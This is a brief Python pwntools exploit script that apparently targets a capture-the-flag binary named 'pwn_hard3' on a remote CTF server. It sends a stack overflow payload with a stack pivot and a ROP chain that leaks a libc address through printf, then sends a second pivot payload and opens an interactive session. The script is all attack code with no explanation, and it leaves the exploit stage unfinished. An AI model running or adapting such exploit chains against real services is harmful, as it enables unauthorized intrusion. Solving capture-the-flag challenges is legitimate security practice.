from pwn import *

#r = process("./pwn_hard3")
r = remote('ctf.kuality.kr',12354)


payload = ''
payload += p64(0x00)*100 # dummy
payload += p64(0x6043c8) # rbp
payload += p64(0x0040077b)  # rip   leave; ret;
payload += p64(0x0400843) # pop rdi; ret; 
#payload += p64(0x000601020) # read
payload += p64(0x000601028) # libc_start_main
payload += p64(0x0000400560) # printf
payload += p64(0x0040077d) # return main
gdb.attach(r,'b* 0x0004007d2')
r.sendlineafter("AAAA : ",payload)


rbp = 0x6043c0
leave_ret = 0x00040077b

payload2 = ''
payload2 += "A"*0x40
payload2 += p64(rbp)
payload2 += p64(leave_ret)

r.sendlineafter("BBBB : ",payload2)




r.interactive()